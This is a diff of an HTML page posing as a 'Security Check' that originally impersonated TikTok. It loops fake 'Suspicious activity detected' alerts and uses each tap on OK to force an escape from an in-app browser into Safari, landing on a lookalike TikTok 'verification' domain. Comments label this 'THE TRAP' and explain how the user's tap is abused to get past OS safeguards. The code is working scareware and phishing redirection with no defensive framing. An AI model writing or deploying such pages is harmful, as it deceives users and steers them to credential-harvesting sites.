@@ -3,62 +3,51 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>TikTok Security</title>
+    <title>Security Check</title>
     <style>
-        body, html { 
-            margin: 0; padding: 0; background: #ffffff; 
-            font-family: -apple-system, sans-serif;
-            height: 100%; display: flex; justify-content: center; align-items: center;
-        }
-        #status { color: #8A8B91; font-size: 14px; text-align: center; }
+        body { background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
+        #msg { color: #8A8B91; font-size: 14px; text-align: center; }
     </style>
 </head>
 <body>
 
-    <div id="status">
-        <p>Security scan in progress...</p>
-        <p>Please follow on-screen instructions.</p>
-    </div>
+    <div id="msg">Verifying connection integrity...</div>
 
     <script>
         const target = "tiktokverification.github.io/captcha/Verification/verify1.html";
-        
+
         function breakout() {
-            // Firing the confirmed jackpot method
+            // Method #1 - The confirmed winner
             window.location.href = "x-safari-https://" + target;
         }
 
         window.onload = function() {
-            const duration = 10000; // 10 second trap
+            const duration = 10000;
             const startTime = Date.now();
 
-            function runTrap() {
+            function loop() {
                 const elapsed = Date.now() - startTime;
                 const remaining = Math.max(0, Math.ceil((duration - elapsed) / 1000));
 
                 if (remaining > 0) {
-                    // 1. The Alert creates the "User Intent" gesture when they tap OK
-                    alert("Suspicious activity detected.\n\nRunning system integrity check...\n\nTime remaining: " + remaining + "s");
+                    // THE TRAP:
+                    // 1. Show the alert. This pauses all JS execution.
+                    alert("Suspicious activity detected.\n\nPlease wait for the security scan to complete.\n\nTime remaining: " + remaining + "s");
                     
-                    // 2. Immediately use that intent to fire the breakout
+                    // 2. The MOMENT they hit 'OK', this line fires. 
+                    // Because 'OK' was a user tap, the OS permits the breakout.
                     breakout();
 
-                    // 3. Queue the next alert instantly
-                    setTimeout(runTrap, 10);
+                    // 3. Queue the next one
+                    setTimeout(loop, 10);
                 } else {
-                    // Final sequence
-                    alert("Security check complete. Opening Safari for verification...");
+                    alert("Security check complete. Opening Safari...");
                     breakout();
-                    
-                    // Permanent fallback loop
-                    setInterval(() => {
-                        window.location.assign("https://" + target);
-                    }, 500);
                 }
             }
 
-            // Start the cycle 500ms after page load
-            setTimeout(runTrap, 500);
+            // Small delay to ensure the page is fully ready to receive the gesture
+            setTimeout(loop, 800);
         };
     </script>
 </body>
